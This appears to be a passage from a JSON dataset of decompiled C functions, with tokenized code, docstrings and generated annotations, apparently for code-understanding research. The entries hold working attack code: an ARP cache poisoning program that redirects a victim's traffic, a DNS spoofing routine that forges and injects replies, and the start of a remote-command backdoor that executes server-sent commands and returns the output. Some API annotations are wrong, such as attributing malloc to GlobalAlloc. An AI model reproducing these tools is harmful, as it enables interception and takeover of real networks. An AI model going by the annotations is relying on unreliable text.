            "}",
            "'",
            "''",
            "command",
            "and",
            "storing",
            "it",
            "in",
            "the",
            "struct",
            "in_addr",
            "pointer",
            "gateway_ip",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "struct",
            "in_addr",
            "*",
            "a1",
            ")",
            "{",
            "FILE",
            "*",
            "stream",
            ";",
            "char",
            "s",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "stream",
            "=",
            "popen",
            "(",
            "\"/sbin/ip route | awk '/default/ {print $3}'\"",
            ",",
            "\"r\"",
            ")",
            ";",
            "if",
            "(",
            "stream",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "s",
            "=",
            "0L",
            "L",
            ";",
            "v4",
            "=",
            "0L",
            "L",
            ";",
            "fgets",
            "(",
            "s",
            ",",
            "15",
            ",",
            "stream",
            ")",
            ";",
            "inet_aton",
            "(",
            "s",
            ",",
            "a1",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "printf",
            "(",
            "\"CHECK FAILED: %s\\n\"",
            ",",
            "\"command_stream\"",
            ")",
            ";",
            "return",
            "1L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read an unsigned 64-bit integer from a specific offset within the FS segment register on x86 architectures, typically employed for low-level system programming or accessing thread information in Windows environments."
        ],
        "longer_label": "The Get_Gateway_IP function uses low-level system programming to read the default gateway IP address from a command stream and populate it into the provided struct in_addr variable."
    },
    {
        "id": 482,
        "docstring_tokens": [
            "The",
            "code",
            "implements",
            "a",
            "program",
            "to",
            "perform",
            "an",
            "ARP",
            "attack",
            "by",
            "poisoning",
            "a",
            "victim",
            "'s",
            "ARP",
            "cache",
            "with",
            "the",
            "attacker",
            "'s",
            "MAC",
            "address",
            ",",
            "redirecting",
            "the",
            "victim",
            "'s",
            "traffic",
            "to",
            "a",
            "target",
            "page",
            ",",
            "and",
            "capturing",
            "packets",
            "using",
            "libpcap",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "size_t",
            "v3",
            ";",
            "size_t",
            "v4",
            ";",
            "size_t",
            "v5",
            ";",
            "size_t",
            "v6",
            ";",
            "char",
            "*",
            "v7",
            ";",
            "char",
            "*",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "__int64",
            "v14",
            ";",
            "unsigned",
            "int",
            "v15",
            ";",
            "char",
            "v16",
            "[",
            "16",
            "]",
            ";",
            "char",
            "s",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v18",
            ";",
            "__int64",
            "v19",
            ";",
            "__int64",
            "v20",
            ";",
            "__int64",
            "v21",
            ";",
            "__int64",
            "v22",
            ";",
            "__int64",
            "v23",
            ";",
            "__int64",
            "v24",
            ";",
            "__int64",
            "v25",
            ";",
            "__int64",
            "v26",
            ";",
            "__int64",
            "v27",
            ";",
            "__int64",
            "v28",
            ";",
            "int",
            "v29",
            ";",
            "unsigned",
            "__int64",
            "v30",
            ";",
            "v30",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v3",
            "=",
            "strlen",
            "(",
            "filter",
            ")",
            ";",
            "v4",
            "=",
            "strlen",
            "(",
            "argv",
            "[",
            "2",
            "]",
            ")",
            ";",
            "filter_string",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "v3",
            "+",
            "v4",
            "+",
            "1",
            ")",
            ";",
            "v5",
            "=",
            "strlen",
            "(",
            "filter",
            ")",
            ";",
            "strncat",
            "(",
            "filter_string",
            ",",
            "filter",
            ",",
            "v5",
            ")",
            ";",
            "v6",
            "=",
            "strlen",
            "(",
            "argv",
            "[",
            "2",
            "]",
            ")",
            ";",
            "strncat",
            "(",
            "filter_string",
            ",",
            "argv",
            "[",
            "2",
            "]",
            ",",
            "v6",
            ")",
            ";",
            "if",
            "(",
            "argc",
            "!",
            "=",
            "4",
            ")",
            "{",
            "fwrite",
            "(",
            "\"usage: arp_attack <interface> <victim's-ip-address> <target_page_to_redirect>\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x4EuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "memset",
            "(",
            "mystruct",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "mystruct",
            ")",
            ")",
            ";",
            "memset",
            "(",
            "&",
            "mystruct",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "__int64",
            ")",
            ")",
            ";",
            "strncpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "mystruct",
            "[",
            "1",
            "]",
            ",",
            "argv",
            "[",
            "3",
            "]",
            ",",
            "8uL",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"Target page has been set to:\\t%s\\n\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "mystruct",
            "[",
            "1",
            "]",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "if_name",
            "=",
            "argv",
            "[",
            "1",
            "]",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "s",
            "=",
            "0L",
            "L",
            ";",
            "v18",
            "=",
            "0L",
            "L",
            ";",
            "v19",
            "=",
            "0L",
            "L",
            ";",
            "v20",
            "=",
            "0L",
            "L",
            ";",
            "v21",
            "=",
            "0L",
            "L",
            ";",
            "v22",
            "=",
            "0L",
            "L",
            ";",
            "v23",
            "=",
            "0L",
            "L",
            ";",
            "v24",
            "=",
            "0L",
            "L",
            ";",
            "v25",
            "=",
            "0L",
            "L",
            ";",
            "v26",
            "=",
            "0L",
            "L",
            ";",
            "v27",
            "=",
            "0L",
            "L",
            ";",
            "v28",
            "=",
            "0L",
            "L",
            ";",
            "v29",
            "=",
            "0",
            ";",
            "sprintf",
            "(",
            "s",
            ",",
            "\"ifconfig %s | grep %s\"",
            ",",
            "*",
            "(",
            "const",
            "char",
            "*",
            "*",
            ")",
            "&",
            "if_name",
            ",",
            "*",
            "(",
            "const",
            "char",
            "*",
            "*",
            ")",
            "&",
            "if_name",
            ")",
            ";",
            "Get_MAC_From_Terminal",
            "(",
            "s",
            ",",
            "(",
            "__int64",
            ")",
            "&",
            "mystruct",
            "[",
            "2",
            "]",
            ")",
            ";",
            "inet_aton",
            "(",
            "argv",
            "[",
            "2",
            "]",
            ",",
            "(",
            "struct",
            "in_addr",
            "*",
            ")",
            "&",
            "mystruct",
            "[",
            "4",
            "]",
            "+",
            "1",
            ")",
            ";",
            "v7",
            "=",
            "inet_ntoa",
            "(",
            "*",
            "(",
            "struct",
            "in_addr",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "mystruct",
            "[",
            "4",
            "]",
            "+",
            "4",
            ")",
            ")",
            ";",
            "Get_Mac_From_IP",
            "(",
            "v7",
            ",",
            "(",
            "__int64",
            ")",
            "&",
            "mystruct",
            "[",
            "2",
            "]",
            "+",
            "6",
            ")",
            ";",
            "Get_Gateway_IP",
            "(",
            "(",
            "struct",
            "in_addr",
            "*",
            ")",
            "&",
            "mystruct",
            "[",
            "5",
            "]",
            ")",
            ";",
            "v8",
            "=",
            "inet_ntoa",
            "(",
            "(",
            "struct",
            "in_addr",
            ")",
            "mystruct",
            "[",
            "5",
            "]",
            ")",
            ";",
            "Get_Mac_From_IP",
            "(",
            "v8",
            ",",
            "(",
            "__int64",
            ")",
            "&",
            "mystruct",
            "[",
            "3",
            "]",
            "+",
            "4",
            ")",
            ";",
            "Print_Network_Variables",
            "(",
            "(",
            "__int64",
            ")",
            "v8",
            ",",
            "(",
            "__int64",
            ")",
            "&",
            "mystruct",
            "[",
            "3",
            "]",
            "+",
            "4",
            ",",
            "v9",
            ",",
            "v10",
            ",",
            "v11",
            ",",
            "v12",
            ",",
            "mystruct",
            "[",
            "0",
            "]",
            ",",
            "mystruct",
            "[",
            "1",
            "]",
            ",",
            "mystruct",
            "[",
            "2",
            "]",
            ",",
            "mystruct",
            "[",
            "3",
            "]",
            ",",
            "mystruct",
            "[",
            "4",
            "]",
            ",",
            "(",
            "struct",
            "in_addr",
            ")",
            "mystruct",
            "[",
            "5",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"filter string:\\t%s\\n\"",
            ",",
            "filter_string",
            ")",
            ";",
            "mystruct",
            "[",
            "0",
            "]",
            "=",
            "pcap_open_live",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "if_name",
            ",",
            "0x2000L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "0xFFFFFFFFL",
            "L",
            ",",
            "pcap_errbuf",
            ")",
            ";",
            "if",
            "(",
            "pcap_errbuf",
            "[",
            "0",
            "]",
            ")",
            "{",
            "puts",
            "(",
            "\"something is wrong in pcap_open_live()..\"",
            ")",
            ";",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"%s\\n\"",
            ",",
            "pcap_errbuf",
            ")",
            ";",
            "}",
            "if",
            "(",
            "mystruct",
            "[",
            "0",
            "]",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "pcap_compile",
            "(",
            "mystruct",
            "[",
            "0",
            "]",
            ",",
            "v16",
            ",",
            "filter_string",
            ",",
            "0L",
            "L",
            ",",
            "v15",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"Error calling pcap_compile\\n\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "pcap_setfilter",
            "(",
            "mystruct",
            "[",
            "0",
            "]",
            ",",
            "v16",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"Error setting filter\\n\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "puts",
            "(",
            "\"pcap handle created, filter compiled and is set\"",
            ")",
            ";",
            "printf",
            "(",
            "\"\\nHave poisoned the victim with my MAC as the gateway's IP\"",
            ")",
            ";",
            "ARP_Inject",
            "(",
            "0",
            ",",
            "&",
            "mystruct",
            "[",
            "2",
            "]",
            ",",
            "(",
            "struct",
            "in_addr",
            "*",
            ")",
            "&",
            "mystruct",
            "[",
            "5",
            "]",
            ",",
            "(",
            "char",
            "*",
            ")",
            "&",
            "mystruct",
            "[",
            "2",
            "]",
            "+",
            "6",
            ",",
            "(",
            "struct",
            "in_addr",
            "*",
            ")",
            "&",
            "mystruct",
            "[",
            "4",
            "]",
            "+",
            "1",
            ",",
            "v14",
            ",",
            "mystruct",
            "[",
            "0",
            "]",
            ")",
            ";",
            "pcap_freecode",
            "(",
            "v16",
            ")",
            ";",
            "pcap_loop",
            "(",
            "mystruct",
            "[",
            "0",
            "]",
            ",",
            "0xFFFFFFFFL",
            "L",
            ",",
            "Main_Callback",
            ",",
            "mystruct",
            ")",
            ";",
            "pcap_close",
            "(",
            "mystruct",
            "[",
            "0",
            "]",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "else",
            "{",
            "printf",
            "(",
            "\"CHECK FAILED: %s\\n\"",
            ",",
            "\"mystruct.handle\"",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is used to read the value from the FS segment register in x64 assembly language, typically utilized for accessing thread-local storage or other system-specific data structures within a process."
        ],
        "longer_label": "The provided code is a C program that sets up an ARP poisoning attack, reads network configurations, compiles and sets packet filters using PCAP library, and utilizes system-specific data structures such as thread-local storage via `__readfsq` assembly instruction."
    },
    {
        "id": 483,
        "docstring_tokens": [
            "The",
            "code",
            "handles",
            "DNS",
            "packets",
            "by",
            "constructing",
            "and",
            "injecting",
            "a",
            "DNS",
            "response",
            "packet",
            "with",
            "various",
            "headers",
            "and",
            "fields",
            ",",
            "using",
            "memory",
            "allocation",
            "and",
            "buffer",
            "manipulation",
            "techniques",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "Handle_DNS",
            "(",
            "_QWORD",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "size_t",
            "a3",
            ")",
            "{",
            "uint16_t",
            "v3",
            ";",
            "uint16_t",
            "v4",
            ";",
            "const",
            "char",
            "*",
            "v5",
            ";",
            "size_t",
            "na",
            ";",
            "size_t",
            "nb",
            ";",
            "size_t",
            "nc",
            ";",
            "size_t",
            "nd",
            ";",
            "size_t",
            "ne",
            ";",
            "size_t",
            "ng",
            ";",
            "size_t",
            "nf",
            ";",
            "_WORD",
            "*",
            "ptr",
            ";",
            "void",
            "*",
            "v16",
            ";",
            "_WORD",
            "*",
            "v17",
            ";",
            "void",
            "*",
            "dest",
            ";",
            "_WORD",
            "*",
            "v19",
            ";",
            "char",
            "*",
            "v20",
            ";",
            "_WORD",
            "s",
            "[",
            "764",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v22",
            ";",
            "v22",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "puts",
            "(",
            "\"Handling DNS now\"",
            ")",
            ";",
            "ptr",
            "=",
            "malloc",
            "(",
            "0xEuL",
            "L",
            ")",
            ";",
            "v16",
            "=",
            "malloc",
            "(",
            "0x14uL",
            "L",
            ")",
            ";",
            "v17",
            "=",
            "malloc",
            "(",
            "8uL",
            "L",
            ")",
            ";",
            "dest",
            "=",
            "malloc",
            "(",
            "8uL",
            "L",
            ")",
            ";",
            "v19",
            "=",
            "malloc",
            "(",
            "0x10uL",
            "L",
            ")",
            ";",
            "v20",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x20uL",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"Offset calculated in the beginning: %d\\n\"",
            ",",
            "54L",
            "L",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "0x5EEuL",
            "L",
            ")",
            ";",
            "memcpy",
            "(",
            "s",
            ",",
            "(",
            "const",
            "void",
            "*",
            ")",
            "a2",
            ",",
            "a3",
            ")",
            ";",
            "puts",
            "(",
            "\"Packet data copied to the buffer\"",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v19",
            "=",
            "a2",
            "+",
            "54",
            ";",
            "v19",
            "[",
            "4",
            "]",
            "=",
            "htons",
            "(",
            "1u",
            ")",
            ";",
            "v19",
            "[",
            "5",
            "]",
            "=",
            "htons",
            "(",
            "1u",
            ")",
            ";",
            "puts",
            "(",
            "\"Query header built\"",
            ")",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "v20",
            "=",
            "htons",
            "(",
            "0xC00Cu",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v20",
            "+",
            "9",
            ")",
            "=",
            "htons",
            "(",
            "1u",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v20",
            "+",
            "10",
            ")",
            "=",
            "htons",
            "(",
            "1u",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v20",
            "+",
            "1",
            ")",
            "=",
            "htonl",
            "(",
            "0xFFu",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v20",
            "+",
            "8",
            ")",
            "=",
            "htons",
            "(",
            "4u",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v20",
            "+",
            "22",
            ")",
            "=",
            "*",
            "*",
            "(",
            "_DWORD",
            "*",
            "*",
            ")",
            "&",
            "targetIP",
            ".",
            "s_addr",
            ";",
            "puts",
            "(",
            "\"Response header built\"",
            ")",
            ";",
            "memcpy",
            "(",
            "dest",
            ",",
            "(",
            "const",
            "void",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "42",
            ")",
            ",",
            "0xCuL",
            "L",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "dest",
            "+",
            "2",
            ")",
            "=",
            "-",
            "127",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "dest",
            "+",
            "3",
            ")",
            "=",
            "0x80",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "dest",
            "+",
            "3",
            ")",
            "=",
            "htons",
            "(",
            "1u",
            ")",
            ";",
            "puts",
            "(",
            "\"DNS header built\"",
            ")",
            ";",
            "*",
            "v17",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "36",
            ")",
            ";",
            "v17",
            "[",
            "1",
            "]",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "34",
            ")",
            ";",
            "v3",
            "=",
            "ntohs",
            "(",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "38",
            ")",
            ")",
            ";",
            "v17",
            "[",
            "2",
            "]",
            "=",
            "htons",
            "(",
            "v3",
            "+",
            "32",
            ")",
            ";",
            "v17",
            "[",
            "3",
            "]",
            "=",
            "htons",
            "(",
            "0",
            ")",
            ";",
            "puts",
            "(",
            "\"UDP header built\"",
            ")",
            ";",
            "memcpy",
            "(",
            "v16",
            ",",
            "(",
            "const",
            "void",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "14",
            ")",
            ",",
            "0x14uL",
            "L",
            ")",
            ";",
            "v4",
            "=",
            "ntohs",
            "(",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v16",
            "+",
            "1",
            ")",
            "=",
            "htons",
            "(",
            "v4",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v16",
            "+",
            "2",
            ")",
            "=",
            "htons",
            "(",
            "0x5555u",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v16",
            "+",
            "3",
            ")",
            "=",
            "htons",
            "(",
            "0",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v16",
            "+",
            "8",
            ")",
            "=",
            "55",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v16",
            "+",
            "5",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "v16",
            "+",
            "3",
            ")",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "30",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "v16",
            "+",
            "4",
            ")",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "26",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v16",
            "+",
            "5",
            ")",
            "=",
            "Calculate_Checksum",
            "(",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "v16",
            ",",
            "0x14uL",
            "L",
            ")",
            ";",
            "puts",
            "(",
            "\"IP header built\"",
            ")",
            ";",
            "memcpy",
            "(",
            "ptr",
            ",",
            "(",
            "const",
            "void",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "6",
            ")",
            ",",
            "6uL",
            "L",
            ")",
            ";",
            "memcpy",
            "(",
            "ptr",
            "+",
            "3",
            ",",
            "(",
            "char",
            "*",
            ")",
            "a1",
            "+",
            "28",
            ",",
            "6uL",
            "L",
            ")",
            ";",
            "ptr",
            "[",
            "6",
            "]",
            "=",
            "htons",
            "(",
            "0x800u",
            ")",
            ";",
            "puts",
            "(",
            "\"Ethernet header built\"",
            ")",
            ";",
            "memcpy",
            "(",
            "s",
            ",",
            "ptr",
            ",",
            "0xEuL",
            "L",
            ")",
            ";",
            "memcpy",
            "(",
            "&",
            "s",
            "[",
            "7",
            "]",
            ",",
            "v16",
            ",",
            "0x14uL",
            "L",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "s",
            "[",
            "17",
            "]",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v17",
            ";",
            "memcpy",
            "(",
            "&",
            "s",
            "[",
            "21",
            "]",
            ",",
            "dest",
            ",",
            "0xCuL",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"Offset calculated before adding DNS response: %d\\n\"",
            ",",
            "54L",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"Size of DNS response header to be copied: %d\\n\"",
            ",",
            "32L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v20",
            ")",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "a3",
            ")",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "v20",
            ";",
            "else",
            "memset",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "a3",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "_WORD",
            ")",
            ")",
            ";",
            "na",
            "=",
            "a3",
            "+",
            "2",
            ";",
            "if",
            "(",
            "v20",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "-",
            "18L",
            "L",
            ")",
            "memset",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "na",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "_WORD",
            ")",
            ")",
            ";",
            "else",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "na",
            ")",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v20",
            "+",
            "9",
            ")",
            ";",
            "nb",
            "=",
            "na",
            "+",
            "2",
            ";",
            "if",
            "(",
            "v20",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "-",
            "20L",
            "L",
            ")",
            "memset",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "nb",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "_WORD",
            ")",
            ")",
            ";",
            "else",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "nb",
            ")",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v20",
            "+",
            "10",
            ")",
            ";",
            "nc",
            "=",
            "nb",
            "+",
            "2",
            ";",
            "if",
            "(",
            "v20",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "-",
            "8L",
            "L",
            ")",
            "memset",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "nc",
            ",",
            "0",
            ",",
            "8uL",
            "L",
            ")",
            ";",
            "else",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "nc",
            ")",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v20",
            "+",
            "1",
            ")",
            ";",
            "nd",
            "=",
            "nc",
            "+",
            "8",
            ";",
            "if",
            "(",
            "v20",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "-",
            "16L",
            "L",
            ")",
            "memset",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "nd",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "_WORD",
            ")",
            ")",
            ";",
            "else",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "nd",
            ")",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v20",
            "+",
            "8",
            ")",
            ";",
            "ne",
            "=",
            "nd",
            "+",
            "2",
            ";",
            "if",
            "(",
            "v20",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "-",
            "22L",
            "L",
            ")",
            "memset",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "ne",
            ",",
            "0",
            ",",
            "4uL",
            "L",
            ")",
            ";",
            "else",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "s",
            "+",
            "ne",
            ")",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v20",
            "+",
            "22",
            ")",
            ";",
            "ng",
            "=",
            "ne",
            "+",
            "4",
            ";",
            "printf",
            "(",
            "\"Calculated size: %d bytes\\n\"",
            ",",
            "ng",
            ")",
            ";",
            "nf",
            "=",
            "(",
            "int",
            ")",
            "pcap_inject",
            "(",
            "*",
            "a1",
            ",",
            "s",
            ",",
            "ng",
            ")",
            ";",
            "if",
            "(",
            "nf",
            "=",
            "=",
            "-",
            "1L",
            "L",
            ")",
            "{",
            "v5",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "pcap_geterr",
            "(",
            "*",
            "a1",
            ")",
            ";",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"Inject Packet Failed:%s\\n\"",
            ",",
            "v5",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "printf",
            "(",
            "\"Created the DNS reply packet, going to inject it, size: %d bytes\\n\"",
            ",",
            "nf",
            ")",
            ";",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "free",
            "(",
            "v16",
            ")",
            ";",
            "free",
            "(",
            "v17",
            ")",
            ";",
            "free",
            "(",
            "v20",
            ")",
            ";",
            "free",
            "(",
            "v19",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v22",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a quadword (64 bits) from a specific offset within the segment pointed to by the FS segment register, primarily for low-level system or kernel programming tasks on x86 architecture.",
            "The `malloc` function appears to be an implementation of dynamic memory allocation using `GlobalAlloc` with `GMEM_ZEROINIT` flag in a Windows environment, typically used to allocate memory for storing data structures or variables during program execution.",
            "The `printf` function in this code snippets is a customized version of the standard C `printf` function, likely used for output formatting and potentially incorporating additional functionality such as handling of floating-point numbers and system-specific behavior.",
            "The `memset` function is used for setting a block of memory to a specified value, typically used for initialization or zeroing out memory."
        ],
        "longer_label": "The provided code is a function likely designed for handling DNS packets, which involves constructing various headers (Ethernet, IP, UDP, DNS, and response headers), calculating checksums, injecting the crafted packet using PCAP, and cleaning up allocated memory, with annotations highlighting the usage of low-level system functions like `__readfsqword`, dynamic memory allocation with `malloc`, and customized output formatting with `printf`."
    },
    {
        "id": 484,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "if",
            "the",
            "program",
            "has",
            "received",
            "enough",
            "command",
            "line",
            "arguments",
            ",",
            "creates",
            "a",
            "network",
            "socket",
            "using",
            "the",
            "provided",
            "arguments",
            ",",
            "receives",
            "server",
            "responses",
            "until",
            "``",
            "exit",
            "''",
            "is",
            "received",
            ",",
            "processes",
            "the",
            "response",
            "using",
            "a",
            "shell",
            "function",
            ",",
            "sends",
            "the",
            "processed",
            "response",
            "back",
            "to",
            "the",
            "server",
            ",",
            "and",
            "finally",
            "closes",
            "the",
            "network",
            "socket",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "uint16_t",
            "v4",
            ";",
            "size_t",
            "v5",
            ";",
            "int",
            "fd",
            ";",
            "char",
            "*",
            "s",
            ";",
            "__int64",
            "buf",
            "[",
            "514",
            "]",
            ";",
            "buf",
            "[",
            "513",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "argc",
            "<",
            "=",
            "1",
            ")",
            "return",
            "-",
            "1",
            ";",
            "v4",
            "=",
            "strtol",
            "(",
            "argv",
            "[",
            "2",
            "]",
            ",",
            "0L",
            "L",
            ",",
            "10",
            ")",
            ";",
            "fd",
            "=",
            "create_socket",
            "(",
            "argv",
            "[",
            "1",
            "]",
            ",",
            "v4",
            ")",
            ";",
            "memset",
            "(",
            "buf",
            ",",
            "0",
            ",",
            "4096",
            ")",
            ";",
            "while",
            "(",
            "strncmp",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "buf",
            ",",
            "\"exit\"",
            ",",
            "4uL",
            "L",
            ")",
            ")",
            "{",
            "recv",
            "(",
            "fd",
            ",",
            "buf",
            ",",
            "0x1000uL",
            "L",
            ",",
            "0",
            ")",
            ";",
            "shell",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "buf",
            ",",
            "(",
            "void",
            "*",
            "*",
            ")",
            "&",
            "s",
            ")",
            ";",
